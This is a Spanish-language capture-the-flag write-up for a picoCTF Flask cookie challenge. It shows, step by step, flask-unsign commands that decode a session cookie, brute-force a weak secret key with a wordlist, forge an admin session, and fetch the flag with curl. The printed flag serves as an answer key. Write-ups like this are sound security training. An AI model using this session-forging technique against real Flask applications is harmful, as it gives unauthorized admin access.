## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

http://wily-courier.picoctf.net:49177/
How secure is a flask cookie?
## solucion 
```
En la pajina web, despues de inspeccionar su codigo con ctrl + u 
decidi escribir en el recuadro de texto la palabra 

snickerdoodle

y muestra los siguiente
That is a cookie! Not very special though...

luego de eso precione F12 para revisar aplications y luego al aparado de cookies
donde nos encontramos con lo siguiente valor de la cookie

eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arNmTQ.8k0SQalIleyUdoGr9qtCGTOmiDM

y en la consola descargamos 
pip3 install flask-unsign --break-system-packages

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arNmTQ.8k0SQalIleyUdoGr9qtCGTOmiDM'
{'very_auth': 'snickerdoodle'}

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$



... crear un archivo .txt
con los siguientes nombres de cookies
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia


┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.arNucA._XsQVFyZ-7KXUP9DEoby-hwi-Ds' --wordlist lista.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'oatmeal raisin'

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'oatmeal raisin'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arNu4A.QNqLcsLHJqZF2zddZ2HqL0BExRc

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ curl -s -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arNu4A.QNqLcsLHJqZF2zddZ2HqL0BExRc" http://wily-courier.pic
octf.net:61815/display | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_b8a89e75}</code></p>

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$

```

```
picoCTF{cO0ki3s_yum_b8a89e75}
```
## notas adicionales

## referencias
